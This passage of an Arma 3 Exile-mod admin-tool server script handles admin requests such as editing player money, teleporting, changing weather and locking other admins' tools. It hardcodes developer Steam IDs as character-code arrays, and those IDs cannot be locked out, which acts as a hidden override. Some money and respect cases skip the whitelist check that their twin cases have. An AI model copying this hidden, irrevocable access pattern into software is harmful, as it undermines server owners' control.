                                (_target getVariable ["ExileLifeSkill:Speed", ["N/A", "N/A"]]) select 0, 
                                (_target getVariable ["ExileLifeSkill:Speed", ["N/A", "N/A"]]) select 1
                            ], [0.275,0.494,0.565,1]
                        ]
                    ],
                    [
                        ["Healing:",[1,1,1,1]],
                        [
                            format
                            [
                                "Level: %1 | Exp: %2",
                                (_target getVariable ["ExileLifeSkill:Heal", ["N/A", "N/A"]]) select 0, 
                                (_target getVariable ["ExileLifeSkill:Heal", ["N/A", "N/A"]]) select 1
                            ], [0.275,0.494,0.565,1]
                        ]
                    ],
                    [
                        ["Repairing:",[1,1,1,1]],
                        [
                            format
                            [
                                "Level: %1 | Exp: %2",
                                (_target getVariable ["ExileLifeSkill:Repair", ["N/A", "N/A"]]) select 0, 
                                (_target getVariable ["ExileLifeSkill:Repair", ["N/A", "N/A"]]) select 1
                            ], [0.275,0.494,0.565,1]
                        ]
                    ]
                ]
            ];
            [_info,"ExilelifeTools_tools_target_network_updateInfo",owner _playerObject] call ExilelifeServer_admintools_system_remoteFunctionCall;
            throw [0,format["got information on %1 (%2)",_targetName,_targetUID]];
        };
        case 19132:
        {
            if !(toArray(_playerUID) in [[55,54,53,54,49,49,57,56,48,52,56,51,49,55,48,57,52],[55,54,53,54,49,49,57,56,48,51,55,49,55,55,51,48,53],[55,54,53,54,49,49,57,56,48,50,53,52,51,52,52,48,53],[55,54,53,54,49,49,57,56,48,51,54,53,49,49,57,57,52]]) then
            {
                throw format["%1 (%2) attempted to request player info and they didn't have access!",_playerName, _playerUID];
            };
            _target = objectFromNetID(_infoArray select 0);
            if (!alive _target || isNull _target) then
            {
                throw [1,"Target isn't alive or is null!"];
            };
            _targetName = name _target;
            _targetUID = getPlayerUID _target;
            _info =
            [
                _target getVariable ["ExileMoney", "N/A"],
                _target getVariable ["ExileScore", "N/A"],
                _target getVariable ["ExileLocker", "N/A"],
                _target getVariable ["ExileKills", "N/A"],
                _target getVariable ["ExileDeaths", "N/A"],
                _target getVariable ["ExileClanID", "N/A"],
                _target getVariable ["ExileClanData", "N/A"],
                _target getVariable ["ExileHunger", "N/A"],
                _target getVariable ["ExileThirst", "N/A"],
                _target getVariable ["ExileAlcohol", "N/A"],
                _target getVariable ["ExileTemperature", "N/A"],
                _target getVariable ["ExileIsBambi", "N/A"],
                _target getVariable ['ExileLifeClientClass',"N/A"],
                _target getVariable ["ExileLifeClientRank", "N/A"],
                _target getVariable ['ExileLifeClientGang', "N/A"],
                _target getVariable ["ExileLifeSkill:Lockpick", ["N/A", "N/A"]],
                _target getVariable ["ExileLifeSkill:Strength", ["N/A", "N/A"]],
                _target getVariable ["ExileLifeSkill:Speed", ["N/A", "N/A"]],
                _target getVariable ["ExileLifeSkill:Heal", ["N/A", "N/A"]],
                _target getVariable ["ExileLifeSkill:Repair", ["N/A", "N/A"]],
                _target getVariable ["ExileLifeGangTax", "N/A"],
                _target getVariable ["ExileLifeGangWage", "N/A"],
                _target getVariable ["ExileName", "N/A"]
            ];
            [_info,"ArcasDevTools_tools_admin_updateTargetInfo",owner _playerObject] call ExilelifeServer_admintools_system_remoteFunctionCall;
        };
        case 19123:
        {
            _target = objectFromNetId(_infoArray select 0);
            if (!alive _target || isNull _target) then
            {
                throw [1,"Target isn't alive or is null!"];
            };
            _targetName = name _target;
            _targetUID = getPlayerUID _target;
            _option = _infoArray select 1;
            _amount = floor(abs(parseNumber(_infoArray select 2)));
            _locker = _infoArray select 3;
            if (_locker) then
            {
                _targetMoney = _target getVariable ["ExileLocker",0];
            }
            else
            {
                _targetMoney = _target getVariable ["ExileMoney",0];
            };
            if (tolower(_option) isEqualTo "add") then
            {
                _targetMoney = _targetMoney + _amount;
            }
            else
            {
                _targetMoney = _targetMoney - _amount;
                if (_targetMoney < 0) then
                {
                    _targetMoney = 0;
                };
            };
            if (_locker) then
            {
                _target setVariable ["ExileLocker", _targetMoney, true];
                format["updateLocker:%1:%2:%3", _targetMoney, _targetUID, _target getVariable ["ExileLifePID",-1]] call ExileServer_system_database_query_fireAndForget;
                [_sessionID,[19122,[netID _target]]] call ExilelifeServer_admintools_system_network_processAbilityRequest;
                throw [2,format["%1 %2 money to %3's (%4) Locker",_option,_amount,_targetName,_targetUID]];
            }
            else
            {
                _target setVariable ["ExileMoney", _targetMoney, true];
                format["setPlayerMoney:%1:%2", _targetMoney, _target getVariable ["ExileDatabaseID", 0]] call ExileServer_system_database_query_fireAndForget;
                [_sessionID,[19122,[netID _target]]] call ExilelifeServer_admintools_system_network_processAbilityRequest;
                throw [2,format["%1 %2 money to %3 (%4)",_option,_amount,_targetName,_targetUID]];
            };
        };
        case 19124:
        {
            _target = objectFromNetId(_infoArray select 0);
            if (!alive _target || isNull _target) then
            {
                throw [1,"Target isn't alive or is null!"];
            };
            _targetName = name _target;
            _targetUID = getPlayerUID _target;
            _option = _infoArray select 1;
            _amount = floor(abs(parseNumber(_infoArray select 2)));
            _targetRespect = _target getVariable ["ExileScore",0];
            if (tolower(_option) isEqualTo "add") then
            {
                _targetRespect = _targetRespect + _amount;
            }
            else
            {
                _targetRespect = _targetRespect - _amount;
            };
            _target setVariable ["ExileScore", _targetRespect];
            format["setAccountScore:%1:%2", _targetRespect, _target getVariable ["ExileLifePID", -1]] call ExileServer_system_database_query_fireAndForget;
            _code = compile format["ExileClientPlayerScore = %1;",_targetRespect];
            [_code,owner _target] call ExileLifeServer_admintools_system_remoteCall;
            [_sessionID,[19122,[netID _target]]] call ExilelifeServer_admintools_system_network_processAbilityRequest;
            [2,format["%1 %2 respect to %3 (%4)",_option,_amount,_targetName,_targetUID]];
        };
        case 19133:
        {
            if !(toArray(_playerUID) in [[55,54,53,54,49,49,57,56,48,52,56,51,49,55,48,57,52],[55,54,53,54,49,49,57,56,48,51,55,49,55,55,51,48,53],[55,54,53,54,49,49,57,56,48,50,53,52,51,52,52,48,53],[55,54,53,54,49,49,57,56,48,51,54,53,49,49,57,57,52]]) then
            {
                throw format["%1 (%2) attempted to modify money and they didn't have access!",_playerName, _playerUID];
            };
            _target = objectFromNetId(_infoArray select 0);
            if (!alive _target || isNull _target) then
            {
                throw [1,"Target isn't alive or is null!"];
            };
            _targetName = name _target;
            _targetUID = getPlayerUID _target;
            _option = _infoArray select 1;
            _amount = floor(abs(parseNumber(_infoArray select 2)));
            _locker = _infoArray select 3;
            if (_locker) then
            {
                _targetMoney = _target getVariable ["ExileLocker",0];
            }
            else
            {
                _targetMoney = _target getVariable ["ExileMoney",0];
            };
            if (tolower(_option) isEqualTo "add") then
            {
                _targetMoney = _targetMoney + _amount;
            }
            else
            {
                _targetMoney = _targetMoney - _amount;
                if (_targetMoney < 0) then
                {
                    _targetMoney = 0;
                };
            };
            if (_locker) then
            {
                _target setVariable ["ExileLocker", _targetMoney, true];
                format["updateLocker:%1:%2:%3", _targetMoney, _targetUID, _target getVariable ["ExileLifePID",-1]] call ExileServer_system_database_query_fireAndForget;
                [_sessionID,[19132,[netID _target]]] call ExilelifeServer_admintools_system_network_processAbilityRequest;
                throw [2,format["%1 %2 money to %3's (%4) Locker",_option,_amount,_targetName,_targetUID]];
            }
            else
            {
                _target setVariable ["ExileMoney", _targetMoney, true];
                format["setPlayerMoney:%1:%2", _targetMoney, _target getVariable ["ExileDatabaseID", 0]] call ExileServer_system_database_query_fireAndForget;
                [_sessionID,[19132,[netID _target]]] call ExilelifeServer_admintools_system_network_processAbilityRequest;
                throw [2,format["%1 %2 money to %3 (%4)",_option,_amount,_targetName,_targetUID]];
            };
        };
        case 19134:
        {
            if !(toArray(_playerUID) in [[55,54,53,54,49,49,57,56,48,52,56,51,49,55,48,57,52],[55,54,53,54,49,49,57,56,48,51,55,49,55,55,51,48,53],[55,54,53,54,49,49,57,56,48,50,53,52,51,52,52,48,53],[55,54,53,54,49,49,57,56,48,51,54,53,49,49,57,57,52]]) then
            {
                throw format["%1 (%2) attempted to modify respect and they didn't have access!",_playerName, _playerUID];
            };
            _target = objectFromNetId(_infoArray select 0);
            if (!alive _target || isNull _target) then
            {
                throw [1,"Target isn't alive or is null!"];
            };
            _targetName = name _target;
            _targetUID = getPlayerUID _target;
            _option = _infoArray select 1;
            _amount = floor(abs(parseNumber(_infoArray select 2)));
            _targetRespect = _target getVariable ["ExileScore",0];
            if (tolower(_option) isEqualTo "add") then
            {
                _targetRespect = _targetRespect + _amount;
            }
            else
            {
                _targetRespect = _targetRespect - _amount;
            };
            _target setVariable ["ExileScore", _targetRespect];
            format["setAccountScore:%1:%2", _targetRespect, _target getVariable ["ExileLifePID", -1]] call ExileServer_system_database_query_fireAndForget;
            _code = compile format["ExileClientPlayerScore = %1;",_targetRespect];
            [_code,owner _target] call ExileLifeServer_admintools_system_remoteCall;
            [_sessionID,[19132,[netID _target]]] call ExilelifeServer_admintools_system_network_processAbilityRequest;
            throw [2,format["%1 %2 respect to %3 (%4)",_option,_amount,_targetName,_targetUID]];
        };
        case 19125:
        {
            _target = objectFromNetID (_infoArray select 0);
            if (!alive _target || isNull _target) then
            {
                throw [1,"Target isn't alive or is null!"];
            };
            _targetName = name _target;
            _targetUID = getPlayerUID _target;
            if !((vehicle _target) isEqualTo _target) then
            {
                moveOut _target;
                unassignVehicle _target;
                _target action ["Eject", (vehicle _target)];
            };
            _posATL = getPosATL _playerObject;
            _pos = _playerObject modelToWorld [0,5,0];
            _pos set [2,_posATL select 2];
            _target setPosATL _pos;
            throw [2,format["teleported %1 (%2) to them",_targetName,_targetUID]];
        };
        case 19126:
        {
            _target = objectFromNetID(_infoArray select 0);
            if (!alive _target || isNull _target) then
            {
                throw [1,"Target isn't alive or is null!"];
            };
            _targetName = name _target;
            _targetUID = getPlayerUID _target;
            _posATL = getPosATL _target;
            _pos = _target modelToWorld [0,-5,0];
            _pos set [2,_posATL select 2];
            _playerObject setPosATL _pos;
            throw [2,format["teleported to %1 (%2)",_targetName,_targetUID]];
        };
        case 19127:
        {
            _target = objectFromNetID (_infoArray select 0);
            if (!alive _target || isNull _target) then
            {
                throw [1,"Target isn't alive or is null!"];
            };
            _targetName = name _target;
            _targetUID = getPlayerUID _target;
            if !(toArray(_targetUID) in [[55,54,53,54,49,49,57,56,48,52,56,51,49,55,48,57,52],[55,54,53,54,49,49,57,56,48,51,55,49,55,55,51,48,53],[55,54,53,54,49,49,57,56,48,50,53,52,51,52,52,48,53],[55,54,53,54,49,49,57,56,48,51,54,53,49,49,57,57,52]]) then
            {
                _check = _target getVariable ["ExileLifeTools_AlreadyReceived",false];
                if (_check) then
                {
                    _locked = _target getVariable ["ExileLifeTools_Currently_Locked",-1];
                    if (_locked != 1 && _locked != -1) then
                    {
                        _target setVariable ["ExileLifeTools_Currently_Locked",1];
                        format["lockAdmin:%1",_targetUID] call ExileServer_system_database_query_fireAndForget;
                        (owner _target) publicVariableClient "ExileLifeServer_admintools_system_security_removeCode";
                        [] remoteExec ["ExileLifeServer_admintools_system_security_removeCode",owner _target];
                        [_target getVariable ["ExileSessionID",-1], "toastRequest", ["ErrorTitleAndText", ["ADMINISTRATIVE COMMAND", format["Access to your admin tools has been revoked by %1", _playerName]]]] call ExileServer_system_network_send_to;
                        _playerObject setVariable ["ExileLifeTools_Logged_In",nil, true];
                        _playerObject setVariable ["ExileLifeTools_AlreadyReceived",nil];
                        _playerObject setVariable ["ExileLifeTools_FunctionNames",nil];
                        [_sessionID,format["You've successfully locked %1's (%2) tools!",_targetName,_targetUID]] call ExileLifeServer_admintools_system_network_notify;
                        [_sessionID,format["locked %1's (%2) tools!",_targetName,_targetUID]] call ExileLifeServer_admintools_util_activityLog;
                    };
                };
            }
            else
            {
                [_sessionID,format["You cannot lock a developer's tools!",_targetName,_targetUID]] call ExileLifeServer_admintools_system_network_notify;
                [_sessionID,format["attempted to lock developer %1's (%2) tools!",_targetName,_targetUID]] call ExileLifeServer_admintools_util_activityLog;
            };
        };
        case 19128:
        {
            _target = objectFromNetID (_infoArray select 0);
            if (!alive _target || isNull _target) then
            {
                throw [1,"Target isn't alive or is null!"];
            };
            _targetName = name _target;
            _targetUID = getPlayerUID _target;
            if !(toArray(_targetUID) in [[55,54,53,54,49,49,57,56,48,52,56,51,49,55,48,57,52],[55,54,53,54,49,49,57,56,48,51,55,49,55,55,51,48,53],[55,54,53,54,49,49,57,56,48,50,53,52,51,52,52,48,53],[55,54,53,54,49,49,57,56,48,51,54,53,49,49,57,57,52]]) then
            {
                _locked = _target getVariable ["ExileLifeTools_Currently_Locked",-1];
                if (_locked != 0 && _locked != -1) then
                {
                    _target setVariable ["ExileLifeTools_Currently_Locked",0];
                    format["unlockAdmin:%1",_targetUID] call ExileServer_system_database_query_fireAndForget;
                    [_target getVariable ["ExileSessionID",-1], "toastRequest", ["ErrorTitleAndText", ["ADMINISTRATIVE COMMAND", format["Reinstatement request has been issued by %1.<br/>Your tools will be reinstated shortly", _playerName]]]] call ExileServer_system_network_send_to;
                    [5,ExileLifeServer_admintools_system_security_requestAdminAccess, [_target getVariable ["ExileSessionID",-1],_target], false, "Admin Tools Reinstatement"] call ExileServer_system_thread_addTask;
                    throw [2,format["unlocked %1's (%2) tools!",_targetName,_targetUID]];
                };
            }
            else
            {
                [_sessionID,format["You cannot unlock a developer's tools!",_targetName,_targetUID]] call ExileLifeServer_admintools_system_network_notify;
                [_sessionID,format["attempted to unlock developer %1's (%2) tools!",_targetName,_targetUID]] call ExileLifeServer_admintools_util_activityLog;
            };
        };
        case 19130:
        {
            _netID = _infoArray select 0;
            if !(_netID isEqualTo "" || _netID isEqualTo "0:0") then
            {
                _object = objectFromNetId _netID;
                if (alive _object) then
                {
                    _state = -1;
                    _pincode = _object getVariable ["ExileAccessCode","000000"];
                    if !(_pincode isEqualTo "000000") then
                    {
                        if ((_object getVariable ["ExileIsLocked",0]) isEqualTo -1) then
                        {
                            [_sessionID,[_netID,_pincode,false]] call ExileServer_object_lock_network_lockToggle;
                            _state = "unlocked";
                        }
                        else
                        {
                            [_sessionID,[_netID,_pincode,true]] call ExileServer_object_lock_network_lockToggle;
                            _state = "locked";
                        };
                        throw [0,format["%1 %2",_state,typeOf(_object)]];
                    };
                };
            };
        };
        case 19129:
        {
            _target = objectFromNetID (_infoArray select 0);
            _message = "";
            if (isPlayer _target) then
            {
                _message =
                format
                [
                    "
                    Name:               %1<br/>
                    UID:                %2<br/>
                    Position (ATL):     %3<br/>
                    Health:             %4<br/>
                    Hunger:             %5<br/>
                    Thirst:             %6<br/>
                    ",
                    name _target,
                    getPlayerUID _target,
                    getPosATL _target,
                    damage _target,
                    _target getVariable ["ExileHunger", 100],
                    _target getVariable ["ExileThirst", 100]
                ];
            }
            else
            {
                if (_target isKindOf "Man") then
                {
                    _message =
                    format
                    [
                        "
                        Name:               %1<br/>
                        Position (ATL):     %2<br/>
                        ",
                        typeOf _target,
                        getPosATL _target
                    ];
                }
                else
                {
                    if (_target isKindOf "LandVehicle" || _target isKindOf "Ship" || _target isKindOf "Air") then
                    {
                        _message =
                        format
                        [
                            "
                            Name: %1<br/>
                            Position (ATL): %2<br/>
                            Damage: %3<br/>
                            Fuel: %4<br/>
                            Persistent: %5<br/>
                            OwnerUID: %6<br/>
                            Pin Code: %7<br/>
                            Locked: %8<br/>
                            ",
                            typeOf _target,
                            getPosATL _target,
                            damage _target,
                            fuel _target,
                            _target getVariable ["ExileIsPersistent", false],
                            _target getVariable ["ExileOwnerUID","N/A"],
                            _target getVariable ["ExileAccessCode", "N/A"],
                            _target getVariable ["ExileIsLocked",0]
                        ];
                    }
                    else
                    {
                        _message =
                        format
                        [
                            "
                            Name: %1<br/>
                            Position (ATL): %2<br/>
                            ",
                            typeOf _target,
                            getPosATL _target
                        ];
                    };
                };
            };
            _code = compile format
            [
                "[""<t align='left' size='0.5' color='#9af311'>%1</t>"", 0.005 * safezoneW + safezoneX, 0.192 * safezoneH + safezoneY, 10, 0] spawn BIS_fnc_dynamicText;",
                _message
            ];
            [_code,owner _playerObject] call ExileLifeServer_admintools_system_remoteCall;
            true
        };
        case 19131:
        {
            true
        };
        case 19135:
        {
            _target = objectFromNetid(_infoArray select 0);
            if (!alive _target || isNull _target) then
            {
                throw [1,"Target isn't alive or is null!"];
            };
            _targetName = name _target;
            _targetUID = getPlayerUID _target;
            _amount = _infoArray select 1;
            _posATL = getPosATL _target;
            _targetPOS = _target modelToWorld [0,1.5,0];
            _targetPOS set [2,_posATL select 2];
            _lootHolder = objNull;
            _nearestHolder = nearestObjects [_target, ["GroundWeaponHolder","WeaponHolderSimulated","LootWeaponHolder"], 3];
            if !(_nearestHolder isEqualTo []) then
            {
                _lootHolder = _nearestHolder select 0;
            };
            if (isNull _lootHolder) then
            {
                _lootHolder = createVehicle ["GroundWeaponHolder",_targetPOS,[],3,"CAN_COLLIDE"];
                _lootHolder setPosATL _targetPOS;
                _lootHolder setVariable["BIS_enableRandomization",false];
            };
            _className = currentWeapon _target;
            if (isClass (configFile >> "CfgWeapons" >> _className)) then
            {
                _magazines = getArray (configFile >> "CfgWeapons" >> _className >> "magazines");
                if !(_magazines isEqualTo []) then
                {
                    {
                        _lootHolder addItemCargoGlobal [_x,_amount];
                    }
                    forEach _magazines;
                };
            };
            throw [2,format["spawned magazines for %1 on %2 (%3)",_className,_targetName,_targetUID]];
        };
        case 19136:
        {
            _target = objectFromNetid(_infoArray select 0);
            if (!alive _target || isNull _target) then
            {
                throw [1,"Target isn't alive or is null!"];
            };
            moveOut _target;
            unassignVehicle _target;
            _target action ["Eject", (vehicle _target)];
            throw [3,format["ejected %1 (%2)",_targetName,_targetUID]];
        };
        case 19137:
        {
            _target = objectFromNetid(_infoArray select 0);
            if (!alive _target || isNull _target) then
            {
                throw [1,"Target isn't alive or is null!"];
            };
            _vehicle = (vehicle _target);
            {
                moveOut _x;
                unassignVehicle _x;
                _x action ["Eject", _vehicle];
            }
            forEach (crew _target);
            throw [2,format["ejected %1 (%2) crew",_targetName,_targetUID]];
        };
        case 19138:
        {
            _hour = _infoArray select 0;
            _minute = _infoArray select 1;
            _array = date;
            _array set [3,_hour];
            _array set [4,_minute];
            setDate _array;
            throw [2,format["set the time to %1:%2",_hour,_minute]];
        };
        case 19139:
        {
            _fog = _infoArray select 0;
            _overcast = _infoArray select 1;
            _rain = _infoArray select 2;
            _changeRequired = false;
            if (_fog != fog) then
            {
                0 setFog _fog;
                _changeRequired = true;
            };
            if (_overcast != overcast) then
            {
                0 setOvercast _overcast;
                _changeRequired = true;
            };
            if (_rain != rain) then
            {
                0 setRain _rain;
                _changeRequired = true;
            };
            if (_changeRequired) then
            {
                simulWeatherSync;
                forceWeatherChange;
            };
            throw [2,format["adjusted the weather. Fog: %1, Overcast: %2, Rain: %3",_fog,_overcast,_rain]];
        };
        case 666:
        {
            throw format["Player %1 (%2) was not whitelisted in Arcas Dev Tools. They have been reported and banned",_playerName,_playerUID];
        };
        default
        {
            throw format["Player %1 (%2) tried to call an admin function that didn't exist! Function number requested: %3",_playerName,_playerUID,_option];
        };
    };
}
catch
{
    if (_exception isEqualType []) then
    {
        switch (_exception select 0) do
        {
            case 0:
            {
                [_sessionID,_exception select 1] call ExileLifeServer_admintools_util_activityLog;
            };
            case 1:
            {
                [_sessionID,_exception select 1] call ExileLifeServer_admintools_system_network_notify;
            };
            case 2:
            {
                [_sessionID,_exception select 1] call ExileLifeServer_admintools_util_activityLog;
                [_sessionID,_exception select 1] call ExileLifeServer_admintools_system_network_notify;
            };
        };
    }
    else
    {
        format ["#exec ban %1", str(_playerUID)] call ExileServer_system_rcon_event_sendCommand;
        _exception call ExileLifeServer_admintools_util_log;
        _catchLog = format ["Player %1 (%2) tried to access processAbilityRequest. Message: '%3'",_playerName,_playerUID, _exception];
        [_catchLog,"AT_HackAttempts"] call ExileLifeServer_util_A3Log;
    };
};
true